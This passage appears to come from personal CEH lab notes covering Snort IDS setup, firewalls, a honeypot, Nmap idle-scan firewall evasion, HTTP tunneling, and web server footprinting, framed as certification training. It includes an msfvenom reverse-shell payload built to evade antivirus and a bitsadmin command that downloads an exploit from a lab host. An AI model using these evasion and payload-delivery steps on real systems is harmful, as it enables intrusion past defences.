machine<ul id="108bdadd-c4a7-80a0-9f30-eaa715cc9556" class="bulleted-list"><li style="list-style-type:circle">Set proxy settings to attacker’s IP and Port 8080</li></ul><ul id="108bdadd-c4a7-809f-a1e7-ddd16a14b1a9" class="bulleted-list"><li style="list-style-type:circle">Visit a website and put on credentials</li></ul></li></ul><ul id="e5c89b4f-6ff5-4351-b04b-26bdc0f24220" class="bulleted-list"><li style="list-style-type:disc">Attacker machine<ul id="108bdadd-c4a7-80f1-8c6c-e4b40a34c656" class="bulleted-list"><li style="list-style-type:circle">View the logs and find the credentials in the body</li></ul></li></ul></details></li></ul></details></li></ul><ul id="107bdadd-c4a7-80b2-a9e4-df503c293070" class="toggle"><li><details open=""><summary>Detect Session Hijacking</summary><ul id="de4ab709-ae75-4b1a-9e54-9c6b61f68e24" class="toggle"><li><details open=""><summary>Detect Session Hijacking using Wireshark</summary><ul id="108bdadd-c4a7-80f8-87bd-cbdb03b8cb23" class="bulleted-list"><li style="list-style-type:disc">Start capturing with <code>Wireshark</code> in observer machine</li></ul><ul id="108bdadd-c4a7-8046-aa1e-f08e50e0f89a" class="bulleted-list"><li style="list-style-type:disc">Start a <code>bettercap -iface eth0</code> in attacker machine<ul id="108bdadd-c4a7-8040-9c47-d7a135f6b045" class="bulleted-list"><li style="list-style-type:circle"><code>net.probe on</code></li></ul><ul id="108bdadd-c4a7-80c1-b1d7-dc3aad77e754" class="bulleted-list"><li style="list-style-type:circle"><code>net.recon on</code></li></ul><ul id="108bdadd-c4a7-80f8-b73d-e53d41c09b1a" class="bulleted-list"><li style="list-style-type:circle"><code>net.sniff on</code></li></ul></li></ul><ul id="108bdadd-c4a7-800d-82b6-c9d17431c919" class="bulleted-list"><li style="list-style-type:disc">In observer machine, notice the extreme amount of arp packets for every IP address</li></ul></details></li></ul></details></li></ul></details></li></ul><ul id="5a3a292f-fc70-445a-9eea-5e3737eccc9d" class="toggle"><li><details open=""><summary>Lab 11 - Evading IDS, Firewalls, and Honeypots</summary><ul id="108bdadd-c4a7-8034-8b84-d5acddc7ac38" class="toggle"><li><details open=""><summary>Perform intrusion detection using various tools</summary><ul id="109bdadd-c4a7-805a-8ad9-f0ee4a658f3e" class="toggle"><li><details open=""><summary>Detect intrusions using Snort</summary><p id="b3e907cb-5262-4a1b-8743-07e6bf9034c6" class="">Snort can perform protocol analysis and content searching/matching and is used to detect a variety of attacks and probes such as buffer overflows, stealth port scans, CGI attacks, SMB probes, and OS fingerprinting attempts. </p><p id="109bdadd-c4a7-80a5-8104-ef170499503c" class="">It uses a flexible rules language to describe traffic to collect or pass, as well as a detection engine that utilizes a modular plug-in architecture.</p><ul id="10bbdadd-c4a7-8005-97de-f0fbdf1e11d5" class="bulleted-list"><li style="list-style-type:disc">Installation<ul id="109bdadd-c4a7-803c-b12f-f5fbf08b977f" class="bulleted-list"><li style="list-style-type:circle">Go to <code><strong>Z:\CEHv12 Module 12 Evading IDS, Firewalls, and Honeypots\Intrusion Detection Tools\Snort</strong></code><strong> </strong>and double-click the <code><strong>Snort_2_9_15_Installer.exe</strong></code></li></ul><ul id="109bdadd-c4a7-80f7-8e4b-e579f7cee06e" class="bulleted-list"><li style="list-style-type:circle">Copy <code>snortrules-snapshot-29150 contents</code> into <code>C:\Snort</code></li></ul></li></ul><ul id="10bbdadd-c4a7-807f-a39e-e567da8aa01f" class="bulleted-list"><li style="list-style-type:disc">Configuration<ul id="0066b836-52c9-437c-854e-ac1f27d83888" class="bulleted-list"><li style="list-style-type:circle">Line 45: Replace <code>any</code> with current IP Address<ul id="10bbdadd-c4a7-808f-9b99-ff1edac94991" class="bulleted-list"><li style="list-style-type:square">this is the target machine that snort will run on</li></ul></li></ul><ul id="10bbdadd-c4a7-8066-ae8f-f46b10291d32" class="bulleted-list"><li style="list-style-type:circle">Line 51: Set DNS Server to <code>8.8.8.8</code></li></ul><ul id="10bbdadd-c4a7-806c-b69a-fb55c80aff46" class="bulleted-list"><li style="list-style-type:circle">Lines 104,105,106: Replace <code>../</code> with <code>C:\Snort\</code></li></ul><ul id="10bbdadd-c4a7-8096-8fd1-faf8a5d6c0ca" class="bulleted-list"><li style="list-style-type:circle">Lines 109,110: Replace <code>../</code> with <code>C:\Snort\</code></li></ul><ul id="10bbdadd-c4a7-808d-9864-f33f52944dd2" class="bulleted-list"><li style="list-style-type:circle">Create files <code>white_list.rules</code> and <code>black_list.rule</code> in <code>C:\Snort\rules</code></li></ul><ul id="10bbdadd-c4a7-80a2-922e-ea8419017af2" class="bulleted-list"><li style="list-style-type:circle">Line 243: Replace directory with <code>C:\Snort\lib\snort_dynamicpreprocessor</code><ul id="2d9e1237-2256-42ef-bc30-45010f862e71" class="bulleted-list"><li style="list-style-type:square">This is the path to the dynamic preprocessor engine</li></ul></li></ul><ul id="10bbdadd-c4a7-80eb-b2be-d008f5c8c189" class="bulleted-list"><li style="list-style-type:circle">Line 246: Replace file path with <code><strong>C:\Snort\lib\snort_dynamicengine\sf_engine.dll</strong></code><ul id="10bbdadd-c4a7-8028-a4ac-cc17c49c9c4b" class="bulleted-list"><li style="list-style-type:square">This is the path to the base preprocessor engine</li></ul></li></ul><ul id="10bbdadd-c4a7-8058-87c5-fcd8eed475f8" class="bulleted-list"><li style="list-style-type:circle">Line 250: Comment it out with <code>#</code> and space next to it</li></ul><ul id="0cb87255-d792-47ec-94f2-27eb58309761" class="bulleted-list"><li style="list-style-type:circle">Lines 262-266: Do the same, comment out with <code>#</code> and space next to it</li></ul><ul id="dd9bdf09-28a0-49f9-8bad-c6990ca6cafe" class="bulleted-list"><li style="list-style-type:circle">Line 326: Delete <code>lzma</code> and the space next to it</li></ul><ul id="10bbdadd-c4a7-8047-87dc-e2f3a184f4d3" class="bulleted-list"><li style="list-style-type:circle">Lines 532, 533: Add paths <code>C:\Snort\etc\</code> next to filenames</li></ul><ul id="67c1677b-35f0-4336-a614-80c0e73e81e5" class="bulleted-list"><li style="list-style-type:circle">Line 534: Write the command <code>output alert_fastL alerts.ids:</code> (include the dots)</li></ul><ul id="10bbdadd-c4a7-8012-b5d9-da5613126ff7" class="bulleted-list"><li style="list-style-type:circle">Replace All <code>ipvar</code> keywords to <code>var</code> (should be 11 entries)<ul id="10bbdadd-c4a7-8001-a9b2-ee7e44d3e1f4" class="bulleted-list"><li style="list-style-type:square">The string ipvar is not recognised by snort</li></ul></li></ul><ul id="10bbdadd-c4a7-8047-be29-c52111a33661" class="bulleted-list"><li style="list-style-type:circle">Add this to the last line of <code>C:\Snort\rules\icmp-info.rules</code> , type <code><strong>alert icmp $EXTERNAL_NET any -&gt; $HOME_NET 10.10.1.19 (msg:&quot;ICMP-INFO PING&quot;; icode:0; itype:8; reference:arachnids,135; reference:cve,1999-0265; classtype:bad-unknown; sid:472; rev:7;)</strong></code><ul id="10bbdadd-c4a7-80e5-a34f-c4d3a7241584" class="bulleted-list"><li style="list-style-type:square">This is so that it captures pings</li></ul><ul id="10bbdadd-c4a7-802b-8051-eb27d4983e21" class="bulleted-list"><li style="list-style-type:square">You can skip it</li></ul></li></ul></li></ul><ul id="10bbdadd-c4a7-8004-bfc3-ee05bd1a7178" class="bulleted-list"><li style="list-style-type:disc">Run<ul id="64dc1c19-267b-4018-9f62-06b1543c5df0" class="bulleted-list"><li style="list-style-type:circle">Identify the physical driver number<ul id="10bbdadd-c4a7-8056-9643-cd091f0286dc" class="bulleted-list"><li style="list-style-type:square">run <code>snort -W</code>  (in the task the index was 1)</li></ul></li></ul><ul id="10bbdadd-c4a7-8010-9415-faaa0aa54437" class="bulleted-list"><li style="list-style-type:circle">Run snort <code>snort.exe -iX -A console -c C;\Snort\etc\snort.conf -I C:\Snort\log -K ascii</code><ul id="2e1b36d4-1a62-4632-9539-de6dce44667c" class="bulleted-list"><li style="list-style-type:square">where X is the index number we found in the previous step</li></ul></li></ul><ul id="bd2de453-d7bd-436d-b386-f964d2ecf87c" class="bulleted-list"><li style="list-style-type:circle">In the example we issued a ping command from another machine and it captured it as an attack due to the rule we created in the last configuration step</li></ul></li></ul></details></li></ul><ul id="10cbdadd-c4a7-80f0-bbde-e068e544eb6c" class="toggle"><li><details open=""><summary>Block Malicious Traffic with ZoneAlarm</summary><ul id="10cbdadd-c4a7-804a-8c80-efff7f37a9a7" class="bulleted-list"><li style="list-style-type:disc">Install it from <code><strong>E:\CEH-Tools\CEHv12 Module 12 Evading IDS, Firewalls, and Honeypots\Firewalls\ZoneAlarm FREE FIREWALL\zafwSetupWeb_158_189_19019.exe</strong></code><ul id="10cbdadd-c4a7-80f8-8b4b-f688fd07e389" class="bulleted-list"><li style="list-style-type:circle">Use <code>Custom Install</code></li></ul><ul id="10cbdadd-c4a7-80ca-aed4-e6329edf8bf6" class="bulleted-list"><li style="list-style-type:circle">Select <code>Set Application Control to AUTO-LEARN mode</code></li></ul><ul id="10cbdadd-c4a7-8082-8c4f-ed266d329e6f" class="bulleted-list"><li style="list-style-type:circle">Skip <code>Add Our Free Chrome Extension</code></li></ul></li></ul><ul id="10cbdadd-c4a7-80d9-b9c8-dc128acd5669" class="bulleted-list"><li style="list-style-type:disc">Block a site or ip<ul id="10cbdadd-c4a7-804e-83f2-e8e7d614d0f8" class="bulleted-list"><li style="list-style-type:circle">Click <code>FIREWALL</code></li></ul><ul id="10cbdadd-c4a7-8023-a258-c6ab42755e93" class="bulleted-list"><li style="list-style-type:circle">Next to Basic Firewall, click <code>View Zones</code></li></ul><ul id="10cbdadd-c4a7-8045-9575-d48bafa520b6" class="bulleted-list"><li style="list-style-type:circle">Click <code>Add -&gt; Host/Site</code></li></ul><ul id="10cbdadd-c4a7-807e-b06d-f735ffdb13bf" class="bulleted-list"><li style="list-style-type:circle">Type the following details:<ul id="10cbdadd-c4a7-8083-bfd7-c7990a77f0cb" class="bulleted-list"><li style="list-style-type:square">Zone: Blocked</li></ul><ul id="10cbdadd-c4a7-8004-b9e9-e70d3364f8a2" class="bulleted-list"><li style="list-style-type:square">Hostname: the IP or domain name</li></ul></li></ul><ul id="10cbdadd-c4a7-802a-a1ab-ff68f6466d02" class="bulleted-list"><li style="list-style-type:circle">Click <code>Lookup</code></li></ul><ul id="10cbdadd-c4a7-8052-932e-ed99aa536f49" class="bulleted-list"><li style="list-style-type:circle">Click <code>Ok</code></li></ul></li></ul><ul id="10cbdadd-c4a7-80aa-9cc3-d6c05129cb27" class="bulleted-list"><li style="list-style-type:disc">Other Firewalls:<ul id="10cbdadd-c4a7-8081-bdf2-c4d01b9f9670" class="bulleted-list"><li style="list-style-type:circle"> <strong>ManageEngine Firewall Analyzer</strong> (manageengine.com)</li></ul><ul id="10cbdadd-c4a7-8020-bacf-ce1a3f8da14e" class="bulleted-list"><li style="list-style-type:circle"><strong>pfSense</strong> (pfsense.org)</li></ul><ul id="10cbdadd-c4a7-809e-a2b9-d5f81ed32e00" class="bulleted-list"><li style="list-style-type:circle"><strong>Sophos XG Firewall</strong> (sophos.com)</li></ul><ul id="10cbdadd-c4a7-8033-8f23-f69c02c77a60" class="bulleted-list"><li style="list-style-type:circle"><strong>Comodo Firewall</strong> (personalfirewall.comodo.com)</li></ul></li></ul></details></li></ul><ul id="10cbdadd-c4a7-8015-9280-ed8f069a2e9c" class="toggle"><li><details open=""><summary>Setup HoneyBOT</summary><p id="10cbdadd-c4a7-80fd-aacc-cfd061b23dff" class="">Its a fucking honeypot</p><p id="10cbdadd-c4a7-806f-b037-d0b194c9f91b" class="">
</p><ul id="10cbdadd-c4a7-8095-8631-d04df80a979f" class="bulleted-list"><li style="list-style-type:disc">Install <code><strong>Z:\CEHv12 Module 12 Evading IDS, Firewalls, and Honeypots\Honeypot Tools\HoneyBOT\HoneyBOT_018.exe</strong></code></li></ul><ul id="10cbdadd-c4a7-808c-93f0-f7ab385be18e" class="bulleted-list"><li style="list-style-type:disc">Run it as Administrator</li></ul><ul id="10cbdadd-c4a7-8018-99e2-c16a78537c09" class="bulleted-list"><li style="list-style-type:disc">Click <code>Yes</code> to configure now<ul id="10cbdadd-c4a7-802e-a8d2-fc92bd34e3b3" class="bulleted-list"><li style="list-style-type:circle">Set the settings as you wish</li></ul><ul id="10cbdadd-c4a7-8057-8c43-dec8f73d8675" class="bulleted-list"><li style="list-style-type:circle">It was reccommended to uncheck <code>Check for Updates</code></li></ul></li></ul><ul id="10cbdadd-c4a7-8041-af4c-f03a8b22a6b7" class="bulleted-list"><li style="list-style-type:disc">It opens a whole lot of ports and can be seen through nmap</li></ul><ul id="10cbdadd-c4a7-8055-86d8-ca6ce7063f54" class="bulleted-list"><li style="list-style-type:disc">Then you can see who tried to connect and their details through the HoneyBOT interface</li></ul></details></li></ul></details></li></ul><ul id="109bdadd-c4a7-8098-a05e-e6bcbd5115e2" class="toggle"><li><details open=""><summary>Evade firewalls using evasion techniques</summary><ul id="10cbdadd-c4a7-80ac-9fd0-c0e507bd9273" class="toggle"><li><details open=""><summary>Bypass windows firewall block using Nmap evasion techniques</summary><p id="10cbdadd-c4a7-803c-a2f4-e8bb9d675635" class="">In this scenario, consider an admin has written certain Windows Firewall rules to block your system from reaching one of the machines in the network. </p><p id="10cbdadd-c4a7-803c-90a4-c7752b7f53eb" class="">You will be taught to use Nmap in such a way that you can perform recon on the target using other active machines on the network and identify the services running on the machine along with their open ports.</p><p id="10cbdadd-c4a7-8089-9d9f-d6758e969f8b" class="">
</p><ul id="10cbdadd-c4a7-803a-af94-f190d024e9bc" class="bulleted-list"><li style="list-style-type:disc">Block the IP of the attacker from victim through firewall <code>Inbound Rule</code></li></ul><ul id="10cbdadd-c4a7-806d-9fa4-e62cbc0111cd" class="bulleted-list"><li style="list-style-type:disc">The following Nmap scans wont work, will show filtered ports:<ul id="10cbdadd-c4a7-8039-a7a9-c7d24a903cc1" class="bulleted-list"><li style="list-style-type:circle"><code>nmap &lt;target&gt;</code></li></ul><ul id="10cbdadd-c4a7-8004-9a2e-f2f82e2584ae" class="bulleted-list"><li style="list-style-type:circle"><code>nmap -sS &lt;target&gt;</code> (TCP SYN Port Scan)</li></ul><ul id="10cbdadd-c4a7-8059-95a6-d20948ce74e2" class="bulleted-list"><li style="list-style-type:circle"><code>nmap -T4 -A &lt;target&gt;</code> (INTENSE Scan)</li></ul></li></ul><ul id="10cbdadd-c4a7-8012-918c-e5212855035a" class="bulleted-list"><li style="list-style-type:disc">What will work:<ul id="10cbdadd-c4a7-8066-823b-c010a3461539" class="bulleted-list"><li style="list-style-type:circle">Find a zombie machine to use:<ul id="10cbdadd-c4a7-8096-97e6-e7478d358552" class="bulleted-list"><li style="list-style-type:square"><code>nmap -sP &lt;target subnet&gt;</code> (Ping sweep)</li></ul></li></ul><ul id="10cbdadd-c4a7-8094-9c7e-dd4bc3a97c86" class="bulleted-list"><li style="list-style-type:circle">Do a zombie scan on the target<ul id="10cbdadd-c4a7-809e-b259-cec7a811de7f" class="bulleted-list"><li style="list-style-type:square"><code>nmap -sI &lt;zombie&gt; &lt;target&gt;</code></li></ul></li></ul><ul id="10cbdadd-c4a7-8034-a7eb-d67bf0a4e0d0" class="bulleted-list"><li style="list-style-type:circle">Note: It didn’t work in the lab for some reason</li></ul></li></ul></details></li></ul><ul id="10cbdadd-c4a7-8028-b6a5-d1273aeda17f" class="toggle"><li><details open=""><summary>Bypass firewall rules using HTTP/FTP tunneling</summary><p id="10cbdadd-c4a7-8031-a3cd-d08de1669c03" class="">HTTP tunneling technology allows attackers to perform various Internet tasks despite the restrictions imposed by firewalls.</p><p id="10cbdadd-c4a7-80b1-a20e-d8f32a40065d" class="">This method can be implemented if the target company has a public web server with port 80 used for HTTP traffic that is unfiltered by its firewall. </p><p id="10cbdadd-c4a7-80d9-ba35-cec5c9f4860e" class="">It encapsulates data inside HTTP traffic (port 80). </p><p id="10cbdadd-c4a7-8064-aa43-c92d78af1503" class="">Many firewalls do not examine the payload of an HTTP packet to confirm that it is legitimate, thus it is possible to tunnel traffic via TCP port 80.</p><p id="10cbdadd-c4a7-8005-846f-d6205725c1a1" class="">
</p><ul id="10cbdadd-c4a7-800c-a771-f5f27024ebea" class="bulleted-list"><li style="list-style-type:disc">This is used in cases where a connection is needed to an external machine but the current machine blocks the connection</li></ul><ul id="10cbdadd-c4a7-808d-9dcc-eddbe7bba325" class="bulleted-list"><li style="list-style-type:disc">So it is basically a post exploitation technique to connect to the outside network when outbound connections are firewalled</li></ul><ul id="10cbdadd-c4a7-8023-946a-c8d5506da34b" class="bulleted-list"><li style="list-style-type:disc">Proxy Machine for Tunelling<ul id="10cbdadd-c4a7-8060-8ecb-c144e730e28a" class="bulleted-list"><li style="list-style-type:circle">Install <code><strong>Z:\CEHv12 Module 12 Evading IDS, Firewalls, and Honeypots\HTTP Tunneling Tools\HTTHost\htthost.exe</strong></code></li></ul><ul id="10cbdadd-c4a7-809f-b3d3-e9d3044107f2" class="bulleted-list"><li style="list-style-type:circle">Go to the <code>Options</code> tab</li></ul><ul id="10cbdadd-c4a7-80f0-bbb0-f5480ee12c2a" class="bulleted-list"><li style="list-style-type:circle">Set <code>Port 90</code></li></ul><ul id="10cbdadd-c4a7-80d7-b419-e58a7f19def9" class="bulleted-list"><li style="list-style-type:circle">Set <code>Personal Password</code></li></ul><ul id="10cbdadd-c4a7-80a9-9686-f93a5ea11e55" class="bulleted-list"><li style="list-style-type:circle">Check <code>Revalidate DNS Names</code></li></ul><ul id="10cbdadd-c4a7-8013-8280-f6dec035deba" class="bulleted-list"><li style="list-style-type:circle">Check <code>Log connections</code> </li></ul><ul id="10cbdadd-c4a7-80c6-ba80-de1832c6194c" class="bulleted-list"><li style="list-style-type:circle">Click <code>Apply</code></li></ul><ul id="10cbdadd-c4a7-804b-97db-c15891ba2b88" class="bulleted-list"><li style="list-style-type:circle">Go to the <code>Application log</code> tab to see the connections</li></ul></li></ul><ul id="10cbdadd-c4a7-80bf-9cb8-ddc9617af3d8" class="bulleted-list"><li style="list-style-type:disc">Machine to connect from<ul id="10cbdadd-c4a7-8095-b630-f754d8bbf359" class="bulleted-list"><li style="list-style-type:circle">Lab scenario:<ul id="10cbdadd-c4a7-8031-b78a-cdde06fb6696" class="bulleted-list"><li style="list-style-type:square">Turn on windows firewall and block all outbound port connections except port 80</li></ul><ul id="10cbdadd-c4a7-804e-8e64-f27dca113503" class="bulleted-list"><li style="list-style-type:square">In this scenario, port 21 is blocked and we cannot connect to any IP through FTP</li></ul><ul id="10cbdadd-c4a7-808d-b604-c25c44c7d94e" class="bulleted-list"><li style="list-style-type:square">So we will  use a proxy machine to do that using an HTTP Tunnel</li></ul></li></ul><ul id="10cbdadd-c4a7-80f4-a97a-fb59e706013d" class="bulleted-list"><li style="list-style-type:circle">Install <code><strong>Z:\CEHv12 Module 12 Evading IDS, Firewalls, and Honeypots\HTTP Tunneling Tools\HTTPort\httport3snfm.exe</strong></code></li></ul><ul id="10cbdadd-c4a7-80e7-bcc0-c3ff424a105f" class="bulleted-list"><li style="list-style-type:circle">Set <code>Port 90</code></li></ul><ul id="10cbdadd-c4a7-805b-99de-c1d3ff86562e" class="bulleted-list"><li style="list-style-type:circle">Set <code>IP &lt;tunnel machine IP&gt;</code> </li></ul><ul id="10cbdadd-c4a7-80b9-9081-ebb53e374b30" class="bulleted-list"><li style="list-style-type:circle">Set Bypass Mode to <code>Remote host</code></li></ul><ul id="10cbdadd-c4a7-80d9-894b-fd768c8d3918" class="bulleted-list"><li style="list-style-type:circle">At <code>Use perosnal remote host</code><ul id="10cbdadd-c4a7-8036-a25a-d93e9efd33fb" class="bulleted-list"><li style="list-style-type:square">Set <code>IP &lt;tunnel machine IP&gt;</code></li></ul><ul id="10cbdadd-c4a7-8065-ad42-c955428f8980" class="bulleted-list"><li style="list-style-type:square">Set <code>Port 90</code></li></ul><ul id="10cbdadd-c4a7-80e1-96da-c924c1b573a0" class="bulleted-list"><li style="list-style-type:square">Set the same <code>Password</code> as before</li></ul></li></ul><ul id="10cbdadd-c4a7-8019-af23-c104669b9309" class="bulleted-list"><li style="list-style-type:circle">In the <code>Port mapping</code> tab<ul id="10cbdadd-c4a7-80f1-ab11-fbc8f2d6e32f" class="bulleted-list"><li style="list-style-type:square">We will port map the connection through localhost</li></ul><ul id="10cbdadd-c4a7-80f5-a9bf-eaf90b8d79b2" class="bulleted-list"><li style="list-style-type:square">Click <code>Add</code></li></ul><ul id="10cbdadd-c4a7-807e-876e-ec320b011619" class="bulleted-list"><li style="list-style-type:square">Right click <code>New mapping</code> → <code>Edit</code> and set a name</li></ul><ul id="10cbdadd-c4a7-804b-9a80-d0d9b60c96da" class="bulleted-list"><li style="list-style-type:square">Set <code>Local port</code> to 21</li></ul><ul id="10cbdadd-c4a7-8017-9bd2-dddf06b79fbb" class="bulleted-list"><li style="list-style-type:square">Set <code>Remote host</code> to 10.10.1.11 (FTP server to connect to)</li></ul><ul id="10cbdadd-c4a7-805e-9de4-f825e535276f" class="bulleted-list"><li style="list-style-type:square">Set <code>Remote port</code> to 21</li></ul></li></ul><ul id="10cbdadd-c4a7-80d9-a099-fece7f919863" class="bulleted-list"><li style="list-style-type:circle">Now we can connect to 10.10.1.11 on ftp through 127.0.0.1 through this machine due to portmapping and tunelling</li></ul></li></ul></details></li></ul><ul id="10cbdadd-c4a7-80d2-b40a-cfb583d9ac4d" class="toggle"><li><details open=""><summary>Bypass antivirus using Metasploit templates</summary><p id="10cbdadd-c4a7-8074-acea-db681c3d120f" class="">We modified a shellcode payload to be less detectable</p><p id="10cbdadd-c4a7-8033-87b7-c1757289a82d" class="">It didn’t do much of a difference in virustotal</p><p id="10cbdadd-c4a7-8068-8635-f4169e414a0d" class="">
</p><ul id="10cbdadd-c4a7-80bc-8164-e69eaf9eb9c1" class="bulleted-list"><li style="list-style-type:disc">Modify <code><strong>/usr/share/metasploit-framework/data/templates/src/pe/exe/template.c</strong></code><ul id="10cbdadd-c4a7-8064-8ef7-d6595349ce7b" class="bulleted-list"><li style="list-style-type:circle">Set <code>SCSIZE</code> to 4000</li></ul></li></ul><ul id="10cbdadd-c4a7-8096-aee8-f8f4027d1053" class="bulleted-list"><li style="list-style-type:disc">Go to <code><strong>/usr/share/metasploit-framework/data/templates/src/pe/exe/</strong></code><ul id="10cbdadd-c4a7-80f5-80c7-cb18a4ac6bfc" class="bulleted-list"><li style="list-style-type:circle">Run <code><strong>i686-w64-mingw32-gcc template.c -lws2_32 -o evasion.exe</strong></code></li></ul></li></ul><ul id="10cbdadd-c4a7-80ef-a017-f53a864ccd39" class="bulleted-list"><li style="list-style-type:disc">Create a payload using that template<ul id="10cbdadd-c4a7-8052-bafe-c8016839d29f" class="bulleted-list"><li style="list-style-type:circle"><code><strong>msfvenom -p windows/shell_reverse_tcp lhost=&lt;target&gt; lport=&lt;port&gt; -x /usr/share/metasploit-framework/data/templates/src/pe/exe/evasion.exe -f exe &gt; /home/attacker/bypass.exe</strong></code></li></ul></li></ul><ul id="10cbdadd-c4a7-80fa-aa38-c4ab1ed8201d" class="bulleted-list"><li style="list-style-type:disc">In the Lab, it showed less detections in virustotal</li></ul></details></li></ul><ul id="10cbdadd-c4a7-80d3-8ef1-e2931831a421" class="toggle"><li><details open=""><summary>Bypass firewall through Windows BITSAdmin</summary><p id="10cbdadd-c4a7-80ed-9e3d-f4933df3e173" class="">BITS is used by system administrators and programmers for downloading files from or uploading files to HTTP webservers and SMB file shares. </p><p id="10cbdadd-c4a7-80a0-9e43-ea6946416158" class="">BITSAdmin is a tool that is used to create download or upload jobs and monitor their progress.</p><p id="10cbdadd-c4a7-8038-8665-d9a3bfa7eb5c" class="">
</p><ul id="10cbdadd-c4a7-80e4-b37a-e3de03f6c518" class="bulleted-list"><li style="list-style-type:disc">We use this so that we download a payload in post exploitation</li></ul><ul id="10cbdadd-c4a7-8091-b1b8-efdcd9d2f544" class="bulleted-list"><li style="list-style-type:disc">Lab contents<ul id="10cbdadd-c4a7-8018-92dc-dd7903952a75" class="bulleted-list"><li style="list-style-type:circle">Create a payload</li></ul><ul id="10cbdadd-c4a7-801b-8cf3-debceadd0d67" class="bulleted-list"><li style="list-style-type:circle">Start a web server to serve it <code>python -m http.server</code></li></ul><ul id="10cbdadd-c4a7-809c-b508-cee9e35755f4" class="bulleted-list"><li style="list-style-type:circle">Download it using <code>bitsadmin</code></li></ul></li></ul><ul id="10cbdadd-c4a7-808a-82f3-fbd0aa11c876" class="bulleted-list"><li style="list-style-type:disc">Use this command to download stuff<ul id="10cbdadd-c4a7-80d8-a8eb-cd620b0707f3" class="bulleted-list"><li style="list-style-type:circle"><code>bitsadmin /transfer  Exploit.exxe http://10.10.1.13:8000 c:\exploit.exe</code></li></ul></li></ul></details></li></ul></details></li></ul></details></li></ul><ul id="10ebdadd-c4a7-80c0-b2d3-ff8134a196cb" class="toggle"><li><details open=""><summary>Lab 12 - Hacking Web Servers</summary><ul id="111bdadd-c4a7-8036-bd03-cfc20b24cd12" class="toggle"><li><details open=""><summary>Footprint Web Servers</summary><ul id="10ebdadd-c4a7-8043-a3b2-f5ea5ad0414f" class="toggle"><li><details open=""><summary>Information gathering using Ghost Eye</summary><ul id="10ebdadd-c4a7-8029-b340-d774c38d75f0" class="bulleted-list"><li style="list-style-type:disc">Using <a href="https://github.com/BullsEye0/ghost_eye">https://github.com/BullsEye0/ghost_eye</a></li></ul><ul id="10ebdadd-c4a7-8006-97d6-ef70e3769436" class="bulleted-list"><li style="list-style-type:disc">Setup<ul id="10ebdadd-c4a7-808a-aa3e-d9e096733bc8" class="bulleted-list"><li style="list-style-type:circle"><code>pip3 install -r requirements.txt</code></li></ul><ul id="10ebdadd-c4a7-80c8-a613-cbb94dff0231" class="bulleted-list"><li style="list-style-type:circle"><code>python3 ghost_eye.py</code></li></ul></li></ul><ul id="10ebdadd-c4a7-80ea-9b5b-d572d61f0563" class="bulleted-list"><li style="list-style-type:disc">Perfom <code>Whois Lookup</code> by typing <code>3</code></li></ul><ul id="10ebdadd-c4a7-80d3-8e10-eb6aeeb6dddc" class="bulleted-list"><li style="list-style-type:disc">Perform <code>DNS Lookup</code> by typing <code>2</code></li></ul><ul id="10ebdadd-c4a7-802c-95ae-c4e3f50c4cb1" class="bulleted-list"><li style="list-style-type:disc">Perform <code>Clickjacking Test</code> by typing <code>6</code><ul id="10ebdadd-c4a7-80ef-9c51-c762b1f0de44" class="toggle"><li><details open=""><summary>What is Clickjacking?</summary><p id="10ebdadd-c4a7-808f-b03f-cd348e1435b8" class="">Clickjacking is a security exploit where an attacker tricks a user into clicking on something different from what the user perceives, typically by embedding a legitimate website inside an invisible iframe or a disguised layer. The user thinks they are interacting with a benign site (e.g., clicking a button or a link), but they are actually performing unintended actions on the embedded site. This could lead to malicious actions like changing account settings, transferring money, or other unauthorized actions.</p><h3 id="10ebdadd-c4a7-80f3-8f88-ee0d04aabacf" class="">What is the X-Frame-Options Header?</h3><p id="10ebdadd-c4a7-80d3-bdcc-f21e6f58fcf4" class="">The <strong>X-Frame-Options</strong> HTTP header is used to control whether a web page can be embedded in an iframe or not. By setting this header, a website can prevent its pages from being embedded in iframes on other domains, thereby protecting itself from clickjacking attacks.</p><h3 id="10ebdadd-c4a7-8095-b03d-d832b6036f77" class="">How it works:</h3><ul id="10ebdadd-c4a7-8070-9302-d2b2dab1ef31" class="bulleted-list"><li style="list-style-type:disc">The header is set by the server in the HTTP response.</li></ul><ul id="10ebdadd-c4a7-804b-a8c6-e16b12e25ba9" class="bulleted-list"><li style="list-style-type:disc">There are three possible values for the <strong>X-Frame-Options</strong> header:<ol type="1" id="10ebdadd-c4a7-804f-8862-e482f04a7875" class="numbered-list" start="1"><li><strong>DENY</strong>: The page cannot be displayed in a frame or iframe, regardless of the origin.</li></ol><ol type="1" id="10ebdadd-c4a7-8035-9312-c384f633e350" class="numbered-list" start="2"><li><strong>SAMEORIGIN</strong>: The page can only be displayed in a frame on the same origin as the website.</li></ol><ol type="1" id="10ebdadd-c4a7-8096-9624-cefefafbcb44" class="numbered-list" start="3"><li><strong>ALLOW-FROM</strong>: The page can be framed only by specific allowed URLs (this option is now deprecated and not widely supported by modern browsers).</li></ol></li></ul></details></li></ul></li></ul></details></li></ul><ul id="10ebdadd-c4a7-800b-83dd-c89de0992c64" class="toggle"><li><details open=""><summary>Perform web server reconnaissance using Skipfish</summary><ul id="10fbdadd-c4a7-8012-9601-fec880c54fb3" class="bulleted-list"><li style="list-style-type:disc">Run <code><strong>skipfish -o &lt;output-dir&gt; -S /usr/share/skipfish/dictionaries/complete.wl http://&lt;ip&gt;:&lt;port&gt;</strong></code></li></ul><ul id="10fbdadd-c4a7-80e1-97a5-f8a91202a92b" class="bulleted-list"><li style="list-style-type:disc">It enumerates the whole web server but takes alot of time to finish</li></ul><ul id="10fbdadd-c4a7-8015-b485-dcc27ad68b87" class="bulleted-list"><li style="list-style-type:disc">You can run it for some time and stop it</li></ul><ul id="10fbdadd-c4a7-8066-86d2-f5b1807b193e" class="bulleted-list"><li style="list-style-type:disc">Then open <code>index.html</code> in the output dir to explore the outcome</li></ul></details></li></ul><ul id="10ebdadd-c4a7-8042-9aeb-ea7ea9ec534d" class="toggle"><li><details open=""><summary>Footprint a web server using the httprecon Tool</summary><ul id="10fbdadd-c4a7-80a8-bd18-c8332a682549" class="bulleted-list"><li style="list-style-type:disc">Run <code><strong>E:\CEH-Tools\CEHv12 Module 13 Hacking Web Servers\Web Server Footprinting Tools\httprecon\httprecon.exe</strong></code></li></ul><ul id="10fbdadd-c4a7-80ac-b948-fb47b6a9e178" class="bulleted-list"><li style="list-style-type:disc">Click <code>Analyze</code></li></ul><ul id="10fbdadd-c4a7-80a9-9cd6-e031f78099a5" class="bulleted-list"><li style="list-style-type:disc">Shows info gathered through HTTP Headers like server version etc.</li></ul></details></li></ul><ul 